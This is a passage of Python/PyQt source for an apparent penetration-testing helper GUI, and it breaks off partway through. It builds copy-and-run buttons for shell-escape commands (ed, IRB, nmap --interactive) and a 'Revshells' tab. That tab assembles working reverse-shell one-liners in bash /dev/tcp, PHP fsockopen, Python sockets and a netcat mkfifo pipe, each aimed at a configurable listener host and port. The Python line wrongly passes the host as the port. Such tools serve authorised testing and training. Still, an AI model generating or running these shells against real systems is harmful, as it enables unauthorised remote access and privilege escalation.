            self.tab5_container_layout.removeWidget(self.tty_awk_divider2)
            self.tty_awk_divider2.deleteLater()
        self.tty_awk_divider2 = QFrame()
        self.tty_awk_divider2.setFrameShape(QFrame.HLine)
        self.tty_awk_divider2.setLineWidth(3)
        self.tty_awk_divider2.setStyleSheet("color: #20C20E;")
        
        # tty_awk_spacer1
        if hasattr(self, 'tty_awk_spacer1'):
            self.tab5_container_layout.removeWidget(self.tty_awk_spacer1)
            self.tty_awk_spacer1.deleteLater()
        self.tty_awk_spacer1 = QLabel()
        self.tty_awk_spacer1.setFixedWidth(40)
        self.tty_awk_spacer1.setFixedHeight(50)
        
        # tty_awk_spacer2
        if hasattr(self, 'tty_awk_spacer2'):
            self.tab5_container_layout.removeWidget(self.tty_awk_spacer2)
            self.tty_awk_spacer2.deleteLater()
        self.tty_awk_spacer2 = QLabel()
        self.tty_awk_spacer2.setFixedWidth(40)
        self.tty_awk_spacer2.setFixedHeight(50)

        # tty_awk_spacer & divider layout
        self.tab5_container_layout.insertWidget(27, self.tty_awk_spacer1)
        self.tab5_container_layout.insertWidget(28, self.tty_awk_divider1)
        self.tab5_container_layout.insertWidget(29, self.tty_awk_divider2)
        self.tab5_container_layout.insertWidget(30, self.tty_awk_spacer2)
        self.tab5_container_layout.addStretch()

# tty_ed
        if hasattr(self, 'tty_ed'):
            self.tab5_container_layout.removeWidget(self.tty_ed)
            self.tty_ed.deleteLater()
        self.tty_ed = QLabel("[+ ed ]")
        self.tty_ed.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab5_container_layout.insertWidget(31,self.tty_ed)

        # tty_ed_Scan1
        if hasattr(self, 'tty_ed_Scan1'):
            self.tab5_container_layout.removeWidget(self.tty_ed_Scan1)
            self.tty_ed_Scan1.deleteLater()
        self.tty_ed_Scan1 = QLabel("ed")
        self.tty_ed_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
            )

        # tty_ed_Scan1 copy button
        if hasattr(self, 'tty_ed_Scan1_Copy'):
            self.tab5_container_layout.removeWidget(self.tty_ed_Scan1_Copy)
            self.tty_ed_Scan1_Copy.deleteLater()
        self.tty_ed_Scan1_Copy = QPushButton()
        self.tty_ed_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.tty_ed_Scan1_Copy.setFixedSize(QSize(20,20))
        self.tty_ed_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.tty_ed_Scan1.text()))
        self.tty_ed_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # tty_ed_Scan1 run button
        if hasattr(self, 'tty_ed_Scan1_Run'):
            self.tab5_container_layout.removeWidget(self.tty_ed_Scan1_Run)
            self.tty_ed_Scan1_Run.deleteLater()
        self.tty_ed_Scan1_Run = QPushButton()
        self.tty_ed_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.tty_ed_Scan1_Run.setFixedSize(QSize(20,20))
        command10 = self.tty_ed_Scan1.text() + "; bash"
        self.tty_ed_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.tty_ed_Scan1_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # tty_ed_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.tty_ed_Scan1_Copy)
        label_layout.addWidget(self.tty_ed_Scan1_Run)
        label_layout.addWidget(self.tty_ed_Scan1)
        self.tab5_container_layout.insertLayout(32, label_layout)
        self.tab5_container_layout.addStretch()

        # tty_ed_Scan2
        if hasattr(self, 'tty_ed_Scan2'):
            self.tab5_container_layout.removeWidget(self.tty_ed_Scan2)
            self.tty_ed_Scan2.deleteLater()
        self.tty_ed_Scan2 = QLabel("!sh")
        self.tty_ed_Scan2.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
            )

        # tty_ed_Scan2 copy button
        if hasattr(self, 'tty_ed_Scan2_Copy'):
            self.tab5_container_layout.removeWidget(self.tty_ed_Scan2_Copy)
            self.tty_ed_Scan2_Copy.deleteLater()
        self.tty_ed_Scan2_Copy = QPushButton()
        self.tty_ed_Scan2_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.tty_ed_Scan2_Copy.setFixedSize(QSize(20,20))
        self.tty_ed_Scan2_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.tty_ed_Scan2.text()))
        self.tty_ed_Scan2_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # tty_ed_Scan2 run button
        if hasattr(self, 'tty_ed_Scan2_Run'):
            self.tab5_container_layout.removeWidget(self.tty_ed_Scan2_Run)
            self.tty_ed_Scan2_Run.deleteLater()
        self.tty_ed_Scan2_Run = QPushButton()
        self.tty_ed_Scan2_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.tty_ed_Scan2_Run.setFixedSize(QSize(20,20))
        command10 = self.tty_ed_Scan2.text() + "; bash"
        self.tty_ed_Scan2_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.tty_ed_Scan2_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # tty_ed_Scan2 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.tty_ed_Scan2_Copy)
        label_layout.addWidget(self.tty_ed_Scan2_Run)
        label_layout.addWidget(self.tty_ed_Scan2)
        self.tab5_container_layout.insertLayout(33, label_layout)
        self.tab5_container_layout.addStretch()

        # tty_ed_divider 1
        if hasattr(self, 'tty_ed_divider1'):
            self.tab5_container_layout.removeWidget(self.tty_ed_divider1)
            self.tty_ed_divider1.deleteLater()
        self.tty_ed_divider1 = QFrame()
        self.tty_ed_divider1.setFrameShape(QFrame.HLine)
        self.tty_ed_divider1.setLineWidth(3)
        self.tty_ed_divider1.setStyleSheet("color: #20C20E;")
        
        # tty_ed_divider2
        if hasattr(self, 'tty_ed_divider2'):
            self.tab5_container_layout.removeWidget(self.tty_ed_divider2)
            self.tty_ed_divider2.deleteLater()
        self.tty_ed_divider2 = QFrame()
        self.tty_ed_divider2.setFrameShape(QFrame.HLine)
        self.tty_ed_divider2.setLineWidth(3)
        self.tty_ed_divider2.setStyleSheet("color: #20C20E;")
        
        # tty_ed_spacer1
        if hasattr(self, 'tty_ed_spacer1'):
            self.tab5_container_layout.removeWidget(self.tty_ed_spacer1)
            self.tty_ed_spacer1.deleteLater()
        self.tty_ed_spacer1 = QLabel()
        self.tty_ed_spacer1.setFixedWidth(40)
        self.tty_ed_spacer1.setFixedHeight(50)
        
        # tty_ed_spacer2
        if hasattr(self, 'tty_ed_spacer2'):
            self.tab5_container_layout.removeWidget(self.tty_ed_spacer2)
            self.tty_ed_spacer2.deleteLater()
        self.tty_ed_spacer2 = QLabel()
        self.tty_ed_spacer2.setFixedWidth(40)
        self.tty_ed_spacer2.setFixedHeight(50)

        # tty_ed_spacer & divider layout
        self.tab5_container_layout.insertWidget(34, self.tty_ed_spacer1)
        self.tab5_container_layout.insertWidget(35, self.tty_ed_divider1)
        self.tab5_container_layout.insertWidget(36, self.tty_ed_divider2)
        self.tab5_container_layout.insertWidget(37, self.tty_ed_spacer2)
        self.tab5_container_layout.addStretch()

# tty_IRB
        if hasattr(self, 'tty_IRB'):
            self.tab5_container_layout.removeWidget(self.tty_IRB)
            self.tty_IRB.deleteLater()
        self.tty_IRB = QLabel("[+ IRB ]")
        self.tty_IRB.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab5_container_layout.insertWidget(38,self.tty_IRB)

        # tty_IRB_Scan1
        if hasattr(self, 'tty_IRB_Scan1'):
            self.tab5_container_layout.removeWidget(self.tty_IRB_Scan1)
            self.tty_IRB_Scan1.deleteLater()
        self.tty_IRB_Scan1 = QLabel("exec \"/bin/sh\"")
        self.tty_IRB_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
            )

        # tty_IRB_Scan1 copy button
        if hasattr(self, 'tty_IRB_Scan1_Copy'):
            self.tab5_container_layout.removeWidget(self.tty_IRB_Scan1_Copy)
            self.tty_IRB_Scan1_Copy.deleteLater()
        self.tty_IRB_Scan1_Copy = QPushButton()
        self.tty_IRB_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.tty_IRB_Scan1_Copy.setFixedSize(QSize(20,20))
        self.tty_IRB_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.tty_IRB_Scan1.text()))
        self.tty_IRB_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # tty_IRB_Scan1 run button
        if hasattr(self, 'tty_IRB_Scan1_Run'):
            self.tab5_container_layout.removeWidget(self.tty_IRB_Scan1_Run)
            self.tty_IRB_Scan1_Run.deleteLater()
        self.tty_IRB_Scan1_Run = QPushButton()
        self.tty_IRB_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.tty_IRB_Scan1_Run.setFixedSize(QSize(20,20))
        command10 = self.tty_IRB_Scan1.text() + "; bash"
        self.tty_IRB_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.tty_IRB_Scan1_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # tty_IRB_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.tty_IRB_Scan1_Copy)
        label_layout.addWidget(self.tty_IRB_Scan1_Run)
        label_layout.addWidget(self.tty_IRB_Scan1)
        self.tab5_container_layout.insertLayout(39, label_layout)
        self.tab5_container_layout.addStretch()

        # tty_IRB_divider 1
        if hasattr(self, 'tty_IRB_divider1'):
            self.tab5_container_layout.removeWidget(self.tty_IRB_divider1)
            self.tty_IRB_divider1.deleteLater()
        self.tty_IRB_divider1 = QFrame()
        self.tty_IRB_divider1.setFrameShape(QFrame.HLine)
        self.tty_IRB_divider1.setLineWidth(3)
        self.tty_IRB_divider1.setStyleSheet("color: #20C20E;")
        
        # tty_IRB_divider2
        if hasattr(self, 'tty_IRB_divider2'):
            self.tab5_container_layout.removeWidget(self.tty_IRB_divider2)
            self.tty_IRB_divider2.deleteLater()
        self.tty_IRB_divider2 = QFrame()
        self.tty_IRB_divider2.setFrameShape(QFrame.HLine)
        self.tty_IRB_divider2.setLineWidth(3)
        self.tty_IRB_divider2.setStyleSheet("color: #20C20E;")
        
        # tty_IRB_spacer1
        if hasattr(self, 'tty_IRB_spacer1'):
            self.tab5_container_layout.removeWidget(self.tty_IRB_spacer1)
            self.tty_IRB_spacer1.deleteLater()
        self.tty_IRB_spacer1 = QLabel()
        self.tty_IRB_spacer1.setFixedWidth(40)
        self.tty_IRB_spacer1.setFixedHeight(50)
        
        # tty_IRB_spacer2
        if hasattr(self, 'tty_IRB_spacer2'):
            self.tab5_container_layout.removeWidget(self.tty_IRB_spacer2)
            self.tty_IRB_spacer2.deleteLater()
        self.tty_IRB_spacer2 = QLabel()
        self.tty_IRB_spacer2.setFixedWidth(40)
        self.tty_IRB_spacer2.setFixedHeight(50)

        # tty_IRB_spacer & divider layout
        self.tab5_container_layout.insertWidget(40, self.tty_IRB_spacer1)
        self.tab5_container_layout.insertWidget(41, self.tty_IRB_divider1)
        self.tab5_container_layout.insertWidget(42, self.tty_IRB_divider2)
        self.tab5_container_layout.insertWidget(43, self.tty_IRB_spacer2)
        self.tab5_container_layout.addStretch()

# tty_nmap
        if hasattr(self, 'tty_nmap'):
            self.tab5_container_layout.removeWidget(self.tty_nmap)
            self.tty_nmap.deleteLater()
        self.tty_nmap = QLabel("[+ Nmap ]")
        self.tty_nmap.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab5_container_layout.insertWidget(44,self.tty_nmap)

        # tty_nmap_Scan1
        if hasattr(self, 'tty_nmap_Scan1'):
            self.tab5_container_layout.removeWidget(self.tty_nmap_Scan1)
            self.tty_nmap_Scan1.deleteLater()
        self.tty_nmap_Scan1 = QLabel("nmap --interactive")
        self.tty_nmap_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
            )

        # tty_nmap_Scan1 copy button
        if hasattr(self, 'tty_nmap_Scan1_Copy'):
            self.tab5_container_layout.removeWidget(self.tty_nmap_Scan1_Copy)
            self.tty_nmap_Scan1_Copy.deleteLater()
        self.tty_nmap_Scan1_Copy = QPushButton()
        self.tty_nmap_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.tty_nmap_Scan1_Copy.setFixedSize(QSize(20,20))
        self.tty_nmap_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.tty_nmap_Scan1.text()))
        self.tty_nmap_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # tty_nmap_Scan1 run button
        if hasattr(self, 'tty_nmap_Scan1_Run'):
            self.tab5_container_layout.removeWidget(self.tty_nmap_Scan1_Run)
            self.tty_nmap_Scan1_Run.deleteLater()
        self.tty_nmap_Scan1_Run = QPushButton()
        self.tty_nmap_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.tty_nmap_Scan1_Run.setFixedSize(QSize(20,20))
        command10 = self.tty_nmap_Scan1.text() + "; bash"
        self.tty_nmap_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.tty_nmap_Scan1_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # tty_nmap_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.tty_nmap_Scan1_Copy)
        label_layout.addWidget(self.tty_nmap_Scan1_Run)
        label_layout.addWidget(self.tty_nmap_Scan1)
        self.tab5_container_layout.insertLayout(45, label_layout)
        self.tab5_container_layout.addStretch()
        # tty_nmap_Scan2
        if hasattr(self, 'tty_nmap_Scan2'):
            self.tab5_container_layout.removeWidget(self.tty_nmap_Scan2)
            self.tty_nmap_Scan2.deleteLater()
        self.tty_nmap_Scan2 = QLabel("!sh")
        self.tty_nmap_Scan2.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
            )

        # tty_nmap_Scan2 copy button
        if hasattr(self, 'tty_nmap_Scan2_Copy'):
            self.tab5_container_layout.removeWidget(self.tty_nmap_Scan2_Copy)
            self.tty_nmap_Scan2_Copy.deleteLater()
        self.tty_nmap_Scan2_Copy = QPushButton()
        self.tty_nmap_Scan2_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.tty_nmap_Scan2_Copy.setFixedSize(QSize(20,20))
        self.tty_nmap_Scan2_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.tty_nmap_Scan2.text()))
        self.tty_nmap_Scan2_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # tty_nmap_Scan2 run button
        if hasattr(self, 'tty_nmap_Scan2_Run'):
            self.tab5_container_layout.removeWidget(self.tty_nmap_Scan2_Run)
            self.tty_nmap_Scan2_Run.deleteLater()
        self.tty_nmap_Scan2_Run = QPushButton()
        self.tty_nmap_Scan2_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.tty_nmap_Scan2_Run.setFixedSize(QSize(20,20))
        command10 = self.tty_nmap_Scan2.text() + "; bash"
        self.tty_nmap_Scan2_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.tty_nmap_Scan2_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # tty_nmap_Scan2 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.tty_nmap_Scan2_Copy)
        label_layout.addWidget(self.tty_nmap_Scan2_Run)
        label_layout.addWidget(self.tty_nmap_Scan2)
        self.tab5_container_layout.insertLayout(46, label_layout)
        self.tab5_container_layout.addStretch()

        # tty_nmap_divider 1
        if hasattr(self, 'tty_nmap_divider1'):
            self.tab5_container_layout.removeWidget(self.tty_nmap_divider1)
            self.tty_nmap_divider1.deleteLater()
        self.tty_nmap_divider1 = QFrame()
        self.tty_nmap_divider1.setFrameShape(QFrame.HLine)
        self.tty_nmap_divider1.setLineWidth(3)
        self.tty_nmap_divider1.setStyleSheet("color: #20C20E;")
        
        # tty_nmap_divider2
        if hasattr(self, 'tty_nmap_divider2'):
            self.tab5_container_layout.removeWidget(self.tty_nmap_divider2)
            self.tty_nmap_divider2.deleteLater()
        self.tty_nmap_divider2 = QFrame()
        self.tty_nmap_divider2.setFrameShape(QFrame.HLine)
        self.tty_nmap_divider2.setLineWidth(3)
        self.tty_nmap_divider2.setStyleSheet("color: #20C20E;")
        
        # tty_nmap_spacer1
        if hasattr(self, 'tty_nmap_spacer1'):
            self.tab5_container_layout.removeWidget(self.tty_nmap_spacer1)
            self.tty_nmap_spacer1.deleteLater()
        self.tty_nmap_spacer1 = QLabel()
        self.tty_nmap_spacer1.setFixedWidth(40)
        self.tty_nmap_spacer1.setFixedHeight(50)
        
        # tty_nmap_spacer2
        if hasattr(self, 'tty_nmap_spacer2'):
            self.tab5_container_layout.removeWidget(self.tty_nmap_spacer2)
            self.tty_nmap_spacer2.deleteLater()
        self.tty_nmap_spacer2 = QLabel()
        self.tty_nmap_spacer2.setFixedWidth(40)
        self.tty_nmap_spacer2.setFixedHeight(50)

        # tty_nmap_spacer & divider layout
        self.tab5_container_layout.insertWidget(47, self.tty_nmap_spacer1)
        self.tab5_container_layout.insertWidget(48, self.tty_nmap_divider1)
        self.tab5_container_layout.insertWidget(49, self.tty_nmap_divider2)
        self.tab5_container_layout.insertWidget(50, self.tty_nmap_spacer2)
        self.tab5_container_layout.addStretch()

#### Revshells
    def revShells(self):
        if not hasattr(self, 'tab6_container'):
            self.tab6_container = QWidget()
            self.tab6_container_layout = QVBoxLayout(self.tab6_container)
            self.tab6_container.setLayout(self.tab6_container_layout)
            self.scroll = QScrollArea()
            self.scroll.setWidget(self.tab6_container)
            self.scroll.setWidgetResizable(True)
            self.tab6_container.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Expanding)
            self.scroll.setVerticalScrollBarPolicy(Qt.ScrollBarAlwaysOn)
            self.tab6_container_layout.setContentsMargins(0,0,0,0)
            self.tab6_container.adjustSize()
            
            self.tab6.setLayout(QVBoxLayout())
            self.tab6.layout().addWidget(self.scroll)
   
# bash
        if hasattr(self, 'bash'):
            self.tab6_container_layout.removeWidget(self.bash)
            self.bash.deleteLater()
        self.bash = QLabel("[+ BASH]")
        self.bash.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab6_container_layout.insertWidget(0,self.bash)

        # bash_Scan1
        if hasattr(self, 'bash_Scan1'):
            self.tab6_container_layout.removeWidget(self.bash_Scan1)
            self.bash_Scan1.deleteLater()
        self.bash_Scan1 = QLabel("bash -i >& /dev/tcp/" + self.lhost + "/" + self.lport + " 0>&1")
        self.bash_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # bash_Scan1 copy button
        if hasattr(self, 'bash_Scan1_Copy'):
            self.tab6_container_layout.removeWidget(self.bash_Scan1_Copy)
            self.bash_Scan1_Copy.deleteLater()
        self.bash_Scan1_Copy = QPushButton()
        self.bash_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.bash_Scan1_Copy.setFixedSize(QSize(20,20))
        self.bash_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.bash_Scan1.text()))
        self.bash_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # bash_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.bash_Scan1_Copy)
        label_layout.addWidget(self.bash_Scan1)
        self.tab6_container_layout.insertLayout(1, label_layout)
        self.tab6_container_layout.addStretch()

        # bash_Scan2
        if hasattr(self, 'bash_Scan2'):
            self.tab6_container_layout.removeWidget(self.bash_Scan2)
            self.bash_Scan2.deleteLater()
        self.bash_Scan2 = QLabel("bash -c \"bash -i >& /dev/tcp/" + self.lhost + "/" + self.lport + " 0>&1\"")
        self.bash_Scan2.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # bash_Scan2 copy button
        if hasattr(self, 'bash_Scan2_Copy'):
            self.tab6_container_layout.removeWidget(self.bash_Scan2_Copy)
            self.bash_Scan2_Copy.deleteLater()
        self.bash_Scan2_Copy = QPushButton()
        self.bash_Scan2_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.bash_Scan2_Copy.setFixedSize(QSize(20,20))
        self.bash_Scan2_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.bash_Scan2.text()))
        self.bash_Scan2_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # bash_Scan2 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.bash_Scan2_Copy)
        label_layout.addWidget(self.bash_Scan2)
        self.tab6_container_layout.insertLayout(2, label_layout)
        self.tab6_container_layout.addStretch()

    # bash_divider 1
        if hasattr(self, 'bash_divider1'):
            self.tab6_container_layout.removeWidget(self.bash_divider1)
            self.bash_divider1.deleteLater()
        self.bash_divider1 = QFrame()
        self.bash_divider1.setFrameShape(QFrame.HLine)
        self.bash_divider1.setLineWidth(3)
        self.bash_divider1.setStyleSheet("color: #20C20E;")
        
        # bash_divider2
        if hasattr(self, 'bash_divider2'):
            self.tab6_container_layout.removeWidget(self.bash_divider2)
            self.bash_divider2.deleteLater()
        self.bash_divider2 = QFrame()
        self.bash_divider2.setFrameShape(QFrame.HLine)
        self.bash_divider2.setLineWidth(3)
        self.bash_divider2.setStyleSheet("color: #20C20E;")
        
        # bash_spacer1
        if hasattr(self, 'bash_spacer1'):
            self.tab6_container_layout.removeWidget(self.bash_spacer1)
            self.bash_spacer1.deleteLater()
        self.bash_spacer1 = QLabel()
        self.bash_spacer1.setFixedWidth(40)
        self.bash_spacer1.setFixedHeight(50)
        
        # bash_spacer2
        if hasattr(self, 'bash_spacer2'):
            self.tab6_container_layout.removeWidget(self.bash_spacer2)
            self.bash_spacer2.deleteLater()
        self.bash_spacer2 = QLabel()
        self.bash_spacer2.setFixedWidth(40)
        self.bash_spacer2.setFixedHeight(50)

        # bash_spacer & divider layout
        self.tab6_container_layout.insertWidget(3, self.bash_spacer1)
        self.tab6_container_layout.insertWidget(4, self.bash_divider1)
        self.tab6_container_layout.insertWidget(5, self.bash_divider2)
        self.tab6_container_layout.insertWidget(6, self.bash_spacer2)
        self.tab6_container_layout.addStretch()

# php
        if hasattr(self, 'php'):
            self.tab6_container_layout.removeWidget(self.php)
            self.php.deleteLater()
        self.php = QLabel("[+ PHP]")
        self.php.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab6_container_layout.insertWidget(7,self.php)

        # php_Scan1
        if hasattr(self, 'php_Scan1'):
            self.tab6_container_layout.removeWidget(self.php_Scan1)
            self.php_Scan1.deleteLater()
        self.php_Scan1 = QLabel("php -r '$sock=fsockopen(\"" + self.lhost + "\"," + self.lport + ");exec(\"/bin/sh -i <&3 >&3 2>&3\");'")
        self.php_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # php_Scan1 copy button
        if hasattr(self, 'php_Scan1_Copy'):
            self.tab6_container_layout.removeWidget(self.php_Scan1_Copy)
            self.php_Scan1_Copy.deleteLater()
        self.php_Scan1_Copy = QPushButton()
        self.php_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.php_Scan1_Copy.setFixedSize(QSize(20,20))
        self.php_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.php_Scan1.text()))
        self.php_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # php_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.php_Scan1_Copy)
        label_layout.addWidget(self.php_Scan1)
        self.tab6_container_layout.insertLayout(8, label_layout)
        self.tab6_container_layout.addStretch()

        # php_divider 1
        if hasattr(self, 'php_divider1'):
            self.tab6_container_layout.removeWidget(self.php_divider1)
            self.php_divider1.deleteLater()
        self.php_divider1 = QFrame()
        self.php_divider1.setFrameShape(QFrame.HLine)
        self.php_divider1.setLineWidth(3)
        self.php_divider1.setStyleSheet("color: #20C20E;")
        
        # php_divider2
        if hasattr(self, 'php_divider2'):
            self.tab6_container_layout.removeWidget(self.php_divider2)
            self.php_divider2.deleteLater()
        self.php_divider2 = QFrame()
        self.php_divider2.setFrameShape(QFrame.HLine)
        self.php_divider2.setLineWidth(3)
        self.php_divider2.setStyleSheet("color: #20C20E;")
        
        # php_spacer1
        if hasattr(self, 'php_spacer1'):
            self.tab6_container_layout.removeWidget(self.php_spacer1)
            self.php_spacer1.deleteLater()
        self.php_spacer1 = QLabel()
        self.php_spacer1.setFixedWidth(40)
        self.php_spacer1.setFixedHeight(50)
        
        # php_spacer2
        if hasattr(self, 'php_spacer2'):
            self.tab6_container_layout.removeWidget(self.php_spacer2)
            self.php_spacer2.deleteLater()
        self.php_spacer2 = QLabel()
        self.php_spacer2.setFixedWidth(40)
        self.php_spacer2.setFixedHeight(50)

        # php_spacer & divider layout
        self.tab6_container_layout.insertWidget(9, self.php_spacer1)
        self.tab6_container_layout.insertWidget(10, self.php_divider1)
        self.tab6_container_layout.insertWidget(11, self.php_divider2)
        self.tab6_container_layout.insertWidget(12, self.php_spacer2)
        self.tab6_container_layout.addStretch() 

# python
        if hasattr(self, 'python'):
            self.tab6_container_layout.removeWidget(self.python)
            self.python.deleteLater()
        self.python = QLabel("[+ Python]")
        self.python.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab6_container_layout.insertWidget(13,self.python)

        # python_Scan1
        if hasattr(self, 'python_Scan1'):
            self.tab6_container_layout.removeWidget(self.python_Scan1)
            self.python_Scan1.deleteLater()
        self.python_Scan1 = QLabel("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + self.lhost + "\"," + self.lhost + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'")
        self.python_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # python_Scan1 copy button
        if hasattr(self, 'python_Scan1_Copy'):
            self.tab6_container_layout.removeWidget(self.python_Scan1_Copy)
            self.python_Scan1_Copy.deleteLater()
        self.python_Scan1_Copy = QPushButton()
        self.python_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.python_Scan1_Copy.setFixedSize(QSize(20,20))
        self.python_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.python_Scan1.text()))
        self.python_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # python_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.python_Scan1_Copy)
        label_layout.addWidget(self.python_Scan1)
        self.tab6_container_layout.insertLayout(14, label_layout)
        self.tab6_container_layout.addStretch()

        # python_divider 1
        if hasattr(self, 'python_divider1'):
            self.tab6_container_layout.removeWidget(self.python_divider1)
            self.python_divider1.deleteLater()
        self.python_divider1 = QFrame()
        self.python_divider1.setFrameShape(QFrame.HLine)
        self.python_divider1.setLineWidth(3)
        self.python_divider1.setStyleSheet("color: #20C20E;")
        
        # python_divider2
        if hasattr(self, 'python_divider2'):
            self.tab6_container_layout.removeWidget(self.python_divider2)
            self.python_divider2.deleteLater()
        self.python_divider2 = QFrame()
        self.python_divider2.setFrameShape(QFrame.HLine)
        self.python_divider2.setLineWidth(3)
        self.python_divider2.setStyleSheet("color: #20C20E;")
        
        # python_spacer1
        if hasattr(self, 'python_spacer1'):
            self.tab6_container_layout.removeWidget(self.python_spacer1)
            self.python_spacer1.deleteLater()
        self.python_spacer1 = QLabel()
        self.python_spacer1.setFixedWidth(40)
        self.python_spacer1.setFixedHeight(50)
        
        # python_spacer2
        if hasattr(self, 'python_spacer2'):
            self.tab6_container_layout.removeWidget(self.python_spacer2)
            self.python_spacer2.deleteLater()
        self.python_spacer2 = QLabel()
        self.python_spacer2.setFixedWidth(40)
        self.python_spacer2.setFixedHeight(50)

        # python_spacer & divider layout
        self.tab6_container_layout.insertWidget(15, self.python_spacer1)
        self.tab6_container_layout.insertWidget(16, self.python_divider1)
        self.tab6_container_layout.insertWidget(17, self.python_divider2)
        self.tab6_container_layout.insertWidget(18, self.python_spacer2)
        self.tab6_container_layout.addStretch() 

# netcat
        if hasattr(self, 'netcat'):
            self.tab6_container_layout.removeWidget(self.netcat)
            self.netcat.deleteLater()
        self.netcat = QLabel("[+ Netcat]")
        self.netcat.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab6_container_layout.insertWidget(19,self.netcat)

        # netcat_Scan1
        if hasattr(self, 'netcat_Scan1'):
            self.tab6_container_layout.removeWidget(self.netcat_Scan1)
            self.netcat_Scan1.deleteLater()
        self.netcat_Scan1 = QLabel("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " + self.lhost + " " + self.lport + " >/tmp/f")
        self.netcat_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # netcat_Scan1 copy button
